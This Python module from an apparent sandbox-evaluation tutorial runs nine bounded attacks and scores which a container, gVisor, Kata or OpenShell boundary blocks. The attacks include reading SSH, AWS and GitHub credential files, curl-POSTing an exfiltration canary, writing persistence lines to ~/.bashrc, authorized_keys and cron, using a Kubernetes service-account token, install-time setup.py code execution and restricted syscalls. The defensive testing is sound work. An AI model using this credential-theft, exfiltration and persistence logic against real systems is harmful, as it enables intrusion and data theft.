"""The nine attacks — run inside the box, the same nine on every rung of the ladder.

This is the whole tutorial in one file. A lesson puts this suite behind a boundary (nothing, a
container, gVisor, Kata, OpenShell) and runs it; the scorecard shows which attacks the boundary
stopped and which it did not. Because the *suite* is fixed and only the *box* changes, two rungs are
directly comparable — which is the entire point of a ladder.

Two rules govern every attack here, and they are what make it safe to actually run:

1. **Bounded, and cleaned up.** Where an attack proves damage (reading planted fakes, writing a
   backdoor line, exhausting resources) it does the real thing at a hard ceiling and then undoes it —
   the backdoor line is removed, the fork test is reaped, the memory test is a child capped at a few
   hundred MB. Nothing is left behind and nothing real is ever at risk: credentials are planted
   fakes, the listener and the second-stage host are ours, the box is destroyed after.
2. **Never a real reverse shell or a real payload execution.** The one place proof-of-damage is
   irresponsible even on a throwaway box is remote code execution. Attack 6 *fetches* a second stage
   and tests whether it *could* bind — it never pipes anything into a shell. Reach, not detonation.

Everything is configured from the environment so the same image runs on every rung and against
whatever listener/gateway the box provides:

    PROBE_GROUPS        which groups to run (default: all in-box groups)
    PROBE_EXFIL_URL     attack 2 — where stolen data would go (our listener). Unset ⇒ raw-egress test
    PROBE_METADATA_URL  attack 4 — cloud-metadata endpoint (default 169.254.169.254)
    PROBE_INDEX_URL     attack 5 — a package index to reach (default: PyPI)
    PROBE_STAGE_URL     attack 6 — the second-stage host (our server)
    PROBE_GATEWAY_URL   policy  — the model gateway an OpenShell allow-list should permit
    PROBE_OFFPOLICY_URL policy  — a host the allow-list should deny (default example.com)
"""

from __future__ import annotations

import ctypes
import errno
import os
import platform
import socket
import struct
import subprocess
import sys
import time
from collections.abc import Callable, Iterator
from pathlib import Path

from .report import Finding, Scorecard

# --- environment config ------------------------------------------------------

EXFIL_URL = os.environ.get("PROBE_EXFIL_URL", "")
METADATA_URL = os.environ.get("PROBE_METADATA_URL", "http://169.254.169.254/latest/meta-data/")
INDEX_URL = os.environ.get("PROBE_INDEX_URL", "")  # empty ⇒ pip's default (PyPI)
STAGE_URL = os.environ.get("PROBE_STAGE_URL", "")
GATEWAY_URL = os.environ.get("PROBE_GATEWAY_URL", "")
OFFPOLICY_URL = os.environ.get("PROBE_OFFPOLICY_URL", "https://example.com")
READONLY_PATH = os.environ.get("PROBE_READONLY_PATH", "/etc/agent-probe-canary")

#: The NODE's own ``uname -r``, supplied by the lesson. Attack 8 asks whose kernel answered, and only
#: the host knows what the node's kernel is — see :func:`kernel`.
NODE_KERNEL = os.environ.get("PROBE_NODE_KERNEL", "")

IS_LINUX = platform.system() == "Linux"
CURL = "/usr/bin/curl" if os.path.exists("/usr/bin/curl") else "curl"

#: Host secret paths an unsandboxed agent can read outright, all relative to $HOME. On the disposable
#: box these are planted FAKES (see :func:`plant_fake_secrets`); in a container with its own root
#: filesystem they simply do not exist, which is how the container closes attack 1.
SECRET_PATHS = (".ssh/id_rsa", ".aws/credentials", ".config/gh/hosts.yml", ".netrc", ".env")

#: Where the kubelet mounts a pod's service-account credentials, unless the spec opts out.
SA_DIR = Path("/var/run/secrets/kubernetes.io/serviceaccount")

#: Canary contents planted by lesson 1 so attack 1 has something to steal. Every value is an obvious
#: FAKE — no real credential ever enters this repo or a box. Planting makes the baseline reproducible
#: anywhere; on a real provisioned box infra plants the same shapes.
_FAKE_SECRETS = {
    ".ssh/id_rsa": "-----BEGIN OPENSSH PRIVATE KEY-----\nCANARY-FAKE-agent-probe-not-a-real-key\n-----END OPENSSH PRIVATE KEY-----\n",
    ".aws/credentials": "[default]\naws_access_key_id = AKIACANARYFAKE00000000\naws_secret_access_key = canary/fake/agent-probe\n",
    ".config/gh/hosts.yml": "github.com:\n  oauth_token: gho_canaryFAKEagentprobe0000\n",
    ".netrc": "machine example.com login canary password fake-agent-probe\n",
    ".env": "API_TOKEN=canary-fake-agent-probe\nDATABASE_URL=postgres://canary:fake@localhost/db\n",
}


def plant_fake_secrets() -> int:
    """Plant obvious-fake canary credentials into $HOME so attack 1 has something to steal.

    Lesson 1 (no boundary) calls this; no other rung does. Returns how many were written. On a
    read-only rootfs (every hardened rung) the writes fail and it returns 0 — which is correct, those
    rungs are supposed to have no secrets to read.
    """
    home = Path.home()
    planted = 0
    for rel, content in _FAKE_SECRETS.items():
        target = home / rel
        try:
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(content, encoding="utf-8")
            planted += 1
        except OSError:
            continue
    return planted


#: Persistence locations attack 3 tries to plant a backdoor in. Each is written, verified, restored.
BACKDOOR_TARGETS = ("~/.bashrc", "~/.profile", "~/.ssh/authorized_keys", "/etc/cron.d/agent-probe")

_MARKER = "# agent-probe-backdoor (removed by the probe)"


# --- shared helpers ----------------------------------------------------------


def _curl_status(
    url: str, *, method: str = "GET", binary: str = CURL, timeout: int = 10, extra: list[str] | None = None
) -> str:
    """HTTP status a real ``curl`` sees. ``000`` = no route (egress denied); ``err`` = curl missing.

    Shelling out to the actual ``curl`` binary — rather than an in-process socket — is deliberate:
    OpenShell's policy is *per-binary*, so the boundary only sees what a script driver does if the
    script driver goes through the same binaries an agent's tools would. Same argv shape, same
    process tree.

    ``extra`` appends further curl flags, which the service-account probe needs for its bearer token
    and CA bundle. It goes through this same function precisely so that request is a real ``curl``
    like every other one — a probe that reached the control plane by some other route would not be
    visible to a per-binary policy, and would then read as a breach on the one rung that stops it.
    """
    if not (os.path.exists(binary) or binary == "curl"):
        return "err"
    argv = [binary, "-sS", "-m", str(timeout), "-X", method, "-o", "/dev/null", "-w", "%{http_code}", url]
    argv[1:1] = extra or []
    try:
        done = subprocess.run(argv, capture_output=True, text=True, timeout=timeout + 5)
        return (done.stdout or "").strip() or "000"
    except FileNotFoundError:
        return "err"
    except Exception:
        return "000"


def _http_outcome(status: str) -> tuple[bool | None, str]:
    """Did an HTTP-based attack obtain what it wanted — and if not, what refused it?

    The status code alone is not the finding; *who produced it* is. Three cases, three boundaries:

    * ``2xx``  — the target accepted. The stolen data left, the metadata answered, the second stage
      downloaded. This is the only outcome in which the attacker got anything.
    * ``000``  — nothing answered at all: no route, DNS failure, connection refused. This is how
      every container rung closes these rows, by removing the network rather than judging it.
    * any other 3-digit status — something answered and **refused**. Under OpenShell that something
      is the L7 policy proxy returning ``403``, and the payload never landed.

    Collapsing the last two into "a request completed, so the host was reachable" is the mistake
    this function exists to prevent, and it is not hypothetical: an OpenShell run scored
    ``egress_offpolicy=403`` as DENIED and ``exfiltrate=403`` as REACHED **in the same run** — the
    same proxy, the same code, opposite verdicts, because :func:`policy` asked whether the request
    was *authorised* while the reach probes asked only whether one *completed*. A denial is not a
    breach, and a report that says otherwise teaches a reader that a boundary they actually have is
    a boundary they lack.

    Why 2xx and not "not 4xx": the reach targets are ours or the cloud's, and when genuinely
    reached they answer 2xx — this tutorial's own listener returns 200 and Scaleway's metadata
    endpoint returns 200. So a non-2xx from one of them means something in the path intervened.
    """
    if status == "err":
        # curl absent: the attack was never attempted. Never let missing tooling look like a
        # boundary — the same reason attack 5 reports ``no-pip`` rather than a false BLOCKED.
        return None, "curl absent — attack NOT measured"
    if status.startswith("2"):
        return True, "the target accepted it"
    if status.isdigit() and status != "000":
        return False, f"HTTP {status} — refused before it landed"
    return False, "no route — egress denied"


def _contained(obtained: bool | None) -> bool | None:
    """Flip "did the attacker get it" into the scorecard's "did the boundary hold", preserving ``None``."""
    return None if obtained is None else not obtained


# --- reach: attacks 1–4 ------------------------------------------------------


def _attack1_credentials() -> Finding:
    """Attack 1 — read planted credentials. Proof of damage: bytes are actually read (never printed)."""
    home = Path.home()
    read: list[str] = []
    for rel in SECRET_PATHS:
        try:
            with open(home / rel, "rb") as fh:
                if fh.read(16):  # touch the bytes; the value is never captured or logged
                    read.append(rel)
        except OSError:
            continue
    return Finding("read_credentials", len(read), len(read) == 0, "reach", detail=",".join(read))


def _attack2_exfiltrate(stolen: int) -> Finding:
    """Attack 2 — exfiltrate to our listener. POSTs a canary (a count + a token), never secret bytes."""
    if EXFIL_URL:
        canary = f"stolen={stolen};token=agent-probe-canary"
        argv = [
            CURL,
            "-sS",
            "-m",
            "10",
            "-X",
            "POST",
            "--data",
            canary,
            "-o",
            "/dev/null",
            "-w",
            "%{http_code}",
            EXFIL_URL,
        ]
        try:
            done = subprocess.run(argv, capture_output=True, text=True, timeout=15)
            status = (done.stdout or "").strip() or "000"
        except Exception:
            status = "000"
        obtained, why = _http_outcome(status)
        return Finding("exfiltrate", status, _contained(obtained), "reach", detail=f"POST {EXFIL_URL} — {why}")
    # No listener configured (e.g. a local smoke test): fall back to a raw-egress reachability check.
    try:
        socket.create_connection(("1.1.1.1", 443), timeout=5).close()
        egress = "open"
    except OSError:
        egress = "blocked"
    return Finding("exfiltrate", egress, egress != "open", "reach", detail="raw egress (no listener set)")


def _attack3_backdoor() -> Finding:
    """Attack 3 — plant persistence, then remove it. Counts locations that accepted the write."""
    planted: list[str] = []
    for target in BACKDOOR_TARGETS:
        path = Path(target).expanduser()
        existed = path.exists()
        try:
            path.parent.mkdir(parents=True, exist_ok=True)
            with open(path, "a", encoding="utf-8") as fh:
                fh.write("\n" + _MARKER + "\n")
        except OSError:
            continue
        # Verify the line is really there, then restore the file to exactly how we found it.
        try:
            wrote = _MARKER in path.read_text(encoding="utf-8", errors="ignore")
        except OSError:
            wrote = False
        _restore(path, existed)
        if wrote:
            planted.append(target)
    return Finding("plant_backdoor", len(planted), len(planted) == 0, "reach", detail=",".join(planted))


def _restore(path: Path, existed: bool) -> None:
    """Undo attack 3: drop the marker line, or delete the file if we created it. Cleanup is mandatory."""
    try:
        if not existed:
            path.unlink(missing_ok=True)
            return
        kept = [ln for ln in path.read_text(encoding="utf-8", errors="ignore").splitlines() if _MARKER not in ln]
        path.write_text("\n".join(kept) + "\n", encoding="utf-8")
    except OSError:
        pass


def _attack4_internal_net() -> Finding:
    """Attack 4 — reach the cloud-metadata endpoint (the classic SSRF target: IAM creds live there)."""
    status = _curl_status(METADATA_URL, timeout=5)
    obtained, why = _http_outcome(status)
    return Finding("cloud_metadata", status, _contained(obtained), "reach", detail=f"{METADATA_URL} — {why}")


def _attack1_sa_token() -> Finding:
    """Attack 1, cluster edition — the one credential only Kubernetes hands out.

    Every pod gets a service-account token mounted at a fixed, guessable path unless the spec says
    otherwise, and it is a *cluster* credential: untrusted code that finds it stops being merely a
    process on a node and becomes an authenticated principal talking to the control plane. Nothing on
    the single-host rungs has an equivalent — which is the point, this is the attack surface the
    cluster ADDS — so this row must distinguish three genuinely different situations:

    * **not in a pod at all** (every chapter-1 and chapter-2 rung) — ``None``. A probe that never ran
      must never look like a boundary that held, and scoring it BLOCKED there would hand lessons 1–5
      a containment they did not earn.
    * **in a pod, no token** — the boundary held: ``automountServiceAccountToken: false`` did its job.
    * **in a pod, token present** — read it and use it.

    ``KUBERNETES_SERVICE_HOST`` is what separates the first two. The kubelet injects it into every
    pod regardless of the automount setting, so it says "there is a cluster here" without saying
    anything about the credential — exactly the discriminator this needs.

    The verdict is over **authentication, not authorisation**. A default service account is permitted
    almost nothing by RBAC, so asking "could it list secrets" scores a perfectly working cluster
    credential as contained. Asking "did the control plane accept it" does not, and it is the honest
    question: the token is a foothold whatever RBAC currently allows, and RBAC drifts.
    """
    if not os.environ.get("KUBERNETES_SERVICE_HOST"):
        return Finding("k8s_sa_token", "n/a-no-cluster", None, "reach", detail="not running in a pod")

    token_file = SA_DIR / "token"
    try:
        token = token_file.read_text(encoding="utf-8").strip()
    except OSError:
        # In a pod, and the path is not there: the pod spec declined the mount. A real boundary.
        return Finding(
            "k8s_sa_token", "absent", True, "reach", detail="automountServiceAccountToken: false — nothing to steal"
        )
    if not token:
        return Finding("k8s_sa_token", "empty", True, "reach", detail="token file present but empty")

    host = os.environ["KUBERNETES_SERVICE_HOST"]
    port = os.environ.get("KUBERNETES_SERVICE_PORT_HTTPS", "443")
    # The API server by IP from the environment, never by DNS name. A NetworkPolicy that denies DNS
    # would otherwise turn "the credential works" into a resolver failure, and the row would report
    # the wrong boundary — the same class of mistake `_http_outcome` exists to prevent.
    extra = ["-H", f"Authorization: Bearer {token}"]
    ca = SA_DIR / "ca.crt"
    extra += ["--cacert", str(ca)] if ca.exists() else ["-k"]
    status = _curl_status(f"https://{host}:{port}/api", timeout=5, extra=extra)

    obtained, why = _http_outcome(status)
    # The token's length, never one byte of the token itself — this is a live cluster credential.
    detail = f"{len(token)}-byte token, control plane {why}"
    return Finding("k8s_sa_token", status, _contained(obtained), "reach", detail=detail)


def reach() -> Iterator[Finding]:
    a1 = _attack1_credentials()
    yield a1
    stolen = a1.value if isinstance(a1.value, int) else 0
    yield _attack2_exfiltrate(stolen)
    yield _attack3_backdoor()
    yield _attack4_internal_net()
    yield _attack1_sa_token()
    home = Path.home()
    try:
        items = len(list(home.iterdir()))
    except OSError:
        items = -1
    yield Finding("home_items", items, None, "reach")
    secretish = sum(1 for k in os.environ if any(m in k.upper() for m in ("KEY", "TOKEN", "SECRET", "PASSWORD")))
    yield Finding("secretish_env", secretish, None, "reach")


# --- abuse: attacks 5–7 ------------------------------------------------------


def _attack5_malicious_package() -> Finding:
    """Attack 5 — install a malicious package. Two mechanisms, one headline.

    Headline (egress-gated): can pip *reach an index* to fetch a package? A typosquat has to be
    pulled from somewhere, so a container that kills egress closes this — but the moment a real agent
    needs *some* network, blanket on/off cannot tell a typosquat fetch from a legitimate GET, which
    is lesson 5's whole argument for per-binary policy.

    Detail (offline): does installing run arbitrary code? A local sdist whose ``setup.py`` writes a
    marker at build time proves install-time code execution with no network at all.
    """
    marker = Path("/tmp/agent-probe-pkg-ran")
    marker.unlink(missing_ok=True)
    code_ran = _offline_setup_code_exec(marker)
    marker.unlink(missing_ok=True)

    argv = [
        sys.executable,
        "-m",
        "pip",
        "install",
        "--dry-run",
        "--no-input",
        "--no-deps",
        "--timeout",
        "8",
        "agent-probe-typosquat-canary",
    ]
    if INDEX_URL:
        argv[argv.index("--dry-run") : argv.index("--dry-run")] = ["--index-url", INDEX_URL]
    try:
        done = subprocess.run(argv, capture_output=True, text=True, timeout=30)
        blob = (done.stdout + done.stderr).lower()
    except Exception:
        blob = "failed to establish"

    # No pip at all is NOT a blocked attack — it is an unmeasured one, and the difference matters.
    # A `uv` venv ships without pip, so the naive reading here is "no index marker matched, therefore
    # contained", which reports a *false BLOCKED on the no-sandbox rung*. `contained=None` is the
    # honest verdict: this probe did not run. Never let a missing tool look like a boundary.
    if "no module named pip" in blob:
        return Finding("malicious_package", "no-pip", None, "abuse", detail="pip absent — attack NOT measured")
    # Order matters: pip prints "could not find a version" for BOTH a real 404 and a failure to reach
    # the index at all, so the connection-failure markers must be tested FIRST or a no-egress box is
    # misread as having reached the index.
    no_egress_markers = (
        "failed to establish",
        "temporary failure",
        "name resolution",
        "name or service not known",
        "connection broken",
        "newconnectionerror",
        "network is unreachable",
        "no route to host",
        "connection refused",
        "max retries exceeded",
    )
    index_markers = ("could not find a version", "no matching distribution", "404", "not found")
    if any(s in blob for s in no_egress_markers):
        reached = "no-egress"
    elif any(s in blob for s in index_markers):
        reached = "index-reached"  # pip talked to the index (the canary 404s — reaching it is the point)
    else:
        reached = "unclear"
    detail = "setup.py code ran offline" if code_ran else "offline code-exec blocked"
    # "unclear" is likewise not a pass: pip answered something we do not recognise, so we do not know
    # whether it reached an index. Only an explicit no-egress signal counts as contained.
    contained = True if reached == "no-egress" else (None if reached == "unclear" else False)
    return Finding("malicious_package", reached, contained, "abuse", detail=detail)


def _offline_setup_code_exec(marker: Path) -> bool:
    """Build a throwaway sdist whose setup.py writes ``marker`` at build time; return whether it ran."""
    import tempfile

    with tempfile.TemporaryDirectory() as d:
        pkg = Path(d)
        (pkg / "setup.py").write_text(
            "from setuptools import setup\n"
            f"open({str(marker)!r}, 'w').close()  # arbitrary code, at install time\n"
            "setup(name='agent-probe-evil', version='0.0.0', py_modules=[])\n"
        )
        try:
            subprocess.run(
                [sys.executable, "-m", "pip", "install", "--no-build-isolation", "--no-index", "-q", str(pkg)],
                capture_output=True,
                text=True,
                timeout=60,
            )
        except Exception:
            return False
    return marker.exists()


def _attack6_reverse_shell() -> Finding:
    """Attack 6 — fetch a second stage and test the ability to open a shell. Reach only, never detonated.

    We fetch the stage (proving ``curl … | sh`` would have material to run) and test whether we can
    ``bind`` a listening socket (proving an inbound backdoor is possible). We never pipe anything into
    a shell and never connect out to a real attacker.
    """
    stage = _curl_status(STAGE_URL, timeout=8) if STAGE_URL else "no-stage-url"
    # A stage the policy refused is a stage we do not have: `curl … | sh` would pipe the proxy's
    # 403 body into a shell, not a payload. Only a 2xx means the second stage actually arrived.
    fetched = _http_outcome(stage)[0] is True if STAGE_URL else False
    try:
        srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", 0))
        srv.listen(1)
        srv.close()
        can_bind = True
    except OSError:
        can_bind = False
    # A reverse shell connects OUT and a second stage is pulled IN — both need egress. bind()
    # succeeds locally even under --network none, but a bind shell nothing can route to is not a
    # usable backdoor, so egress is what decides reachability; bind is reported as context.
    try:
        socket.create_connection(("1.1.1.1", 443), timeout=5).close()
        egress = True
    except OSError:
        egress = False
    reachable = fetched or egress
    value = f"stage={stage},egress={'open' if egress else 'blocked'},bind={'ok' if can_bind else 'denied'}"
    return Finding("reverse_shell", value, not reachable, "abuse", detail="fetch + connect-out, never detonated")


def _attack7_resource_exhaustion() -> Finding:
    """Attack 7 — exhaust resources, bounded. Reports whether a cap intervened before a low ceiling."""
    pids_capped, pids_reached = _pids_test(ceiling=200)
    mem_capped, mem_reached_mb = _memory_test(ceiling_mb=512, chunk_mb=16)
    capped = pids_capped or mem_capped
    if capped:
        why = ",".join(w for w, hit in (("pids", pids_capped), ("mem", mem_capped)) if hit)
        value = f"capped:{why}"
    else:
        value = f"no-cap:pids>={pids_reached},mem>={mem_reached_mb}MB"
    return Finding("resource_exhaustion", value, capped, "abuse", detail="fork + memory, hard ceiling")


def _pids_test(ceiling: int) -> tuple[bool, int]:
    """Fork short-lived children up to ``ceiling``; a refusal before the ceiling means a pids cap bit."""
    children: list[int] = []
    capped = False
    try:
        for _ in range(ceiling):
            try:
                pid = os.fork()
            except OSError as exc:
                capped = exc.errno in (errno.EAGAIN, errno.ENOMEM)
                break
            if pid == 0:  # child: exist briefly so concurrency is real, then vanish
                try:
                    time.sleep(1.5)
                finally:
                    os._exit(0)
            children.append(pid)
    finally:
        for pid in children:  # reap every child — never leave the fork test running
            try:
                os.kill(pid, 9)
                os.waitpid(pid, 0)
            except OSError:
                pass
    return capped, len(children)


def _memory_test(ceiling_mb: int, chunk_mb: int) -> tuple[bool, int]:
    """Allocate in a child up to ``ceiling_mb``; if the child is OOM-killed or errors, a cap bit."""
    try:
        pid = os.fork()
    except OSError:
        return False, 0
    if pid == 0:
        blocks: list[bytearray] = []
        done = 0
        try:
            while done < ceiling_mb:
                blocks.append(bytearray(chunk_mb * 1024 * 1024))  # zero-filled ⇒ pages are resident
                done += chunk_mb
            os._exit(0)  # reached the ceiling with nothing intervening
        except MemoryError:
            os._exit(42)
    deadline = time.monotonic() + 8
    while time.monotonic() < deadline:
        wpid, status = os.waitpid(pid, os.WNOHANG)
        if wpid == pid:
            killed = os.WIFSIGNALED(status) and os.WTERMSIG(status) == 9
            errored = os.WIFEXITED(status) and os.WEXITSTATUS(status) == 42
            return (killed or errored), ceiling_mb
        time.sleep(0.05)
    try:
        os.kill(pid, 9)
        os.waitpid(pid, 0)
    except OSError:
        pass
    return False, ceiling_mb


def abuse() -> Iterator[Finding]:
    """Attacks 5–7. Yielded one at a time, and attack 7 is deliberately LAST — see :data:`_RUN_ORDER`."""
    yield _attack5_malicious_package()
    yield _attack6_reverse_shell()
    yield _attack7_resource_exhaustion()


# --- kernel: attack 8 (ported from the prior art — arch-aware, do not guess) -------------------

# Syscall numbers are per-architecture. The wrong number would report ENOSYS for a syscall that
# simply does not exist at that index — inventing a gVisor result on a plain container — so an
# unknown arch records "unknown-arch" and no verdict rather than guessing.
_SYSCALL_NRS = {
    "x86_64": {"bpf": 321, "io_uring_setup": 425, "perf_event_open": 298},
    "aarch64": {"bpf": 280, "io_uring_setup": 425, "perf_event_open": 241},
    "arm64": {"bpf": 280, "io_uring_setup": 425, "perf_event_open": 241},
}


#: How each restricted syscall is *actually attempted*: a real, well-formed call that would succeed
#: on a kernel willing to serve this caller.
#:
#: The obvious cheap probe — call it with null arguments and read the errno — cannot answer the
#: question attack 8 asks, and fails in both directions. Testing only for ``ENOSYS`` reports a plain
#: container's ``EPERM`` as a *successful* ``bpf()`` when ``--cap-drop ALL`` is exactly why it failed.
#: Treating ``EINVAL``/``EFAULT`` as success is no better: measured on this tutorial's own boxes, a
#: Kata guest running kernel 6.18.35 with ``CapEff: 0000000000000000`` answers ``EINVAL`` to a
#: null-argument ``bpf()`` — the newer kernel validates arguments *before* checking the capability —
#: so an argument-shaped refusal gets reported as a breach on a rung where nothing broke.
#:
#: A valid call has no such ambiguity: it either returns a file descriptor, or it is refused, and the
#: errno then says which boundary refused it.
_SYSCALL_ARGS = {
    # bpf(BPF_MAP_CREATE, &attr, size): a 1-entry hash map with 4-byte keys and values.
    "bpf": ("<IIIII", (1, 4, 4, 1, 0), 0),
    # io_uring_setup(1, &params): the smallest possible ring.
    "io_uring_setup": (None, None, 1),
    # perf_event_open(&attr, pid=0, cpu=-1, group_fd=-1, flags=0): PERF_TYPE_SOFTWARE / SW_CPU_CLOCK.
    "perf_event_open": ("<IIQ", (1, 128, 0), 0),
}

#: Why a call was refused, kept alongside the errno because *how* it is refused is the finding. A
#: reimplemented kernel that never heard of ``bpf`` and a real kernel refusing a caller whose
#: capabilities were dropped are different boundaries that happen to share an outcome.
_ERRNO_MEANING = {
    "ENOSYS": "not implemented — a user-space kernel",
    "EPERM": "refused — capability dropped",
    "EACCES": "refused — capability or sysctl",
    "ENODEV": "no such device in this sandbox",
    "EOPNOTSUPP": "refused — unsupported here",
    "EINVAL": "refused — rejected a valid request",
    "EFAULT": "refused — rejected a valid request",
}


def kernel() -> Iterator[Finding]:
    """Attack 8 — enumerate the host kernel and call restricted syscalls. THE gVisor/Kata discriminator.

    The question is *whose kernel answered*, and in-box code cannot answer it alone: a workload sees
    only the kernel it is talking to. So the lesson passes the node's own ``uname -r`` in as
    ``PROBE_NODE_KERNEL`` and the verdict is simply "is this a different kernel from the node's".

    That one change makes the row correct on every rung at once. Matching on ``"gvisor"`` in the
    release string — the obvious shortcut — is right for exactly one boundary and quietly wrong for
    the other: Kata's guest kernel reports ``6.18.35``, contains no such marker, and would be scored
    as a *breach* on the rung that most thoroughly isolates the kernel.
    """
    release = platform.release()
    if NODE_KERNEL:
        differs = release != NODE_KERNEL
        detail = f"node runs {NODE_KERNEL}" if differs else "the SAME kernel as the node"
        yield Finding("kernel_identity", release, differs, "kernel", detail=detail)
    else:
        # Never guess. An unjudged row is honest; a wrongly-judged one is the failure this repo exists
        # to prevent, and on this row it would misreport the single most important boundary.
        yield Finding("kernel_identity", release, None, "kernel", detail="PROBE_NODE_KERNEL unset — cannot judge")

    if not IS_LINUX:
        na = "n/a-" + platform.system().lower()
        for name in ("sys_module_count", "kallsyms_readable", "bpf", "io_uring_setup", "perf_event_open"):
            yield Finding(name, na, None, "kernel")
        return

    try:
        modules = len(os.listdir("/sys/module"))
    except OSError:
        modules = 0
    # Zero modules is one way to close this (gVisor exposes no /sys/module at all). A different
    # kernel is the other: Kata's guest lists its OWN 80-odd modules, which tells an attacker nothing
    # about the node's 200-odd. Counting them without asking WHOSE they are scores the second case as
    # a breach.
    own_kernel = bool(NODE_KERNEL) and release != NODE_KERNEL
    detail = "the guest kernel's own modules, not the node's" if (own_kernel and modules) else ""
    yield Finding("sys_module_count", modules, modules == 0 or own_kernel, "kernel", detail=detail)

    try:
        with open("/proc/kallsyms", "rb") as fh:
            head = fh.read(64)
        readable = bool(head.strip()) and not head.startswith(b"0000000000000000")
    except OSError:
        readable = False
    yield Finding("kallsyms_readable", readable, not readable, "kernel")

    nrs = _SYSCALL_NRS.get(platform.machine(), {})
    if not nrs:
        for name in ("bpf", "io_uring_setup", "perf_event_open"):
            yield Finding(name, "unknown-arch", None, "kernel")
        return

    libc = ctypes.CDLL(None, use_errno=True)

    def attempt(name: str, nr: int) -> tuple[str, bool]:
        """Make a real, well-formed call. Returns (reading, reached).

        ``reached`` is true only when the kernel handed back a file descriptor — the agent genuinely
        got the capability. Anything else is a refusal, and the errno names which boundary did it.
        Read alongside ``sys_module_count``: a plain container's default seccomp already answers
        ENOSYS for ``io_uring_setup``, so one ENOSYS is never proof of gVisor on its own.
        """
        layout, values, first_arg = _SYSCALL_ARGS[name]
        buf = ctypes.create_string_buffer(128)  # zeroed; the kernel requires the unused tail to be 0
        if layout is not None and values is not None:
            struct.pack_into(layout, buf, 0, *values)

        ctypes.set_errno(0)
        if name == "perf_event_open":
            rc = libc.syscall(
                ctypes.c_long(nr), buf, ctypes.c_long(0), ctypes.c_long(-1), ctypes.c_long(-1), ctypes.c_long(0)
            )
        elif name == "io_uring_setup":
            rc = libc.syscall(ctypes.c_long(nr), ctypes.c_long(first_arg), buf)
        else:  # bpf(BPF_MAP_CREATE, &attr, sizeof(attr))
            rc = libc.syscall(ctypes.c_long(nr), ctypes.c_long(first_arg), buf, ctypes.c_long(128))

        if rc >= 0:
            os.close(rc)  # never leave the map or the ring open — the probe proves reach, not use
            return f"fd={rc}", True
        code = ctypes.get_errno()
        return errno.errorcode.get(code, f"errno-{code}"), False

    for name, nr in nrs.items():
        reading, reached = attempt(name, nr)
        detail = "REACHED — the call succeeded" if reached else _ERRNO_MEANING.get(reading, "refused")
        yield Finding(name, reading, not reached, "kernel", detail=detail)


# --- policy: OpenShell rungs only (ported from the prior art) --------------------------------


def policy() -> Iterator[Finding]:
    """Per-binary, method-aware egress + path-level filesystem policy. Meaningful only under OpenShell."""
    gw = _curl_status(GATEWAY_URL.rstrip("/") + "/v1/models") if GATEWAY_URL else "no-gateway"
    yield Finding("egress_gateway", gw, _http_outcome(gw)[0] is True, "policy", detail="should ALLOW")

    off = _curl_status(OFFPOLICY_URL)
    yield Finding("egress_offpolicy", off, not off.startswith("2"), "policy", detail="should DENY")

    # Method-aware (L7): the SAME allowed host and the SAME binary, but a write verb. A kernel-level
    # sandbox sees one socket either way; only an L7 policy can allow the GET and deny the POST.
    post = _curl_status(GATEWAY_URL.rstrip("/") + "/v1/models", method="POST") if GATEWAY_URL else "no-gateway"
    yield Finding("http_method_denied", post, not post.startswith("2"), "policy", detail="POST should DENY")

    # Per-binary: the SAME curl, copied to a path the policy does not name. Only identity changes —
    # exactly what a kernel-level sandbox cannot see and a per-binary policy can.
    clone = "/tmp/agent-probe-unlisted-curl"
    try:
        import shutil

        shutil.copy(CURL, clone)
        os.chmod(clone, 0o755)
        scoped = _curl_status(GATEWAY_URL.rstrip("/") + "/v1/models", binary=clone) if GATEWAY_URL else "no-gateway"
    except Exception:
        scoped = "copy-failed"
    yield Finding("binary_scoped", scoped, not str(scoped).startswith("2"), "policy", detail="unlisted binary")

    # Path-level filesystem policy (Landlock). The probe that regresses to ALLOWED when gVisor's
    # user-space kernel answers ENOSYS to Landlock — the silent composition failure lesson 14 shows.
    try:
        with open(READONLY_PATH, "w") as fh:
            fh.write("")
        os.remove(READONLY_PATH)
        wrote = "ALLOWED"
    except OSError as exc:
        wrote = type(exc).__name__
    yield Finding("fs_policy_write", wrote, wrote != "ALLOWED", "policy", detail="Landlock target")


# --- cost: the price of the boundary -----------------------------------------


def cost() -> Iterator[Finding]:
    """min-of-3 timings; a single sample invents differences that are really just scheduler noise."""
    stat_target = "/etc/hostname" if os.path.exists("/etc/hostname") else "/etc/hosts"

    def best_ms(fn: Callable[[], object], reps: int = 3) -> float:
        times: list[float] = []
        for _ in range(reps):
            t0 = time.perf_counter()
            fn()
            times.append((time.perf_counter() - t0) * 1000)
        return round(min(times), 1)

    def syscall_bound() -> None:
        for _ in range(20000):
            os.stat(stat_target)

    def cpu_bound() -> int:
        total = 0
        for i in range(3_000_000):
            total += i
        return total

    yield Finding("syscall_ms", best_ms(syscall_bound), None, "cost")
    yield Finding("cpu_ms", best_ms(cpu_bound), None, "cost")


# --- driver ------------------------------------------------------------------

_RUNNERS = {"reach": reach, "abuse": abuse, "kernel": kernel, "policy": policy, "cost": cost}

#: Execution order, independent of the report order in :data:`attacks.report.GROUPS`.
#:
#: ``abuse`` runs LAST because attack 7 is the one probe that can take the whole sandbox down with
#: it, and under a user-space kernel it reliably does: gVisor's sentry and its per-task stub
#: processes live *inside* the container's cgroup, so a 128-way fork bomb that merely earns
#: ``EAGAIN`` under runc gets the entire sandbox OOM-killed under ``runsc``. Measured, not assumed.
#: Running it last means such a death costs only attack 7's own row — every other reading is already
#: out on stdout, and the host records attack 7 from the exit status. Run it first and a lesson's
#: whole scorecard vanishes, which on the gVisor rung is precisely the kernel evidence it exists for.
_RUN_ORDER = ("reach", "kernel", "policy", "cost", "abuse")


def run_groups(groups: list[str], on_finding: Callable[[Finding], None] | None = None) -> Scorecard:
    """Run the requested in-box groups and return the collected scorecard.

    ``on_finding`` is called with each finding the moment it is produced, which is what lets the
    driver stream results out of a box that may not live long enough to print a final scorecard.
    """
    card = Scorecard()
    for group in sorted(groups, key=_RUN_ORDER.index):
        runner = _RUNNERS.get(group)
        if runner is None:
            continue
        for finding in runner():
            card.add(finding)
            if on_finding is not None:
                on_finding(finding)
    return card
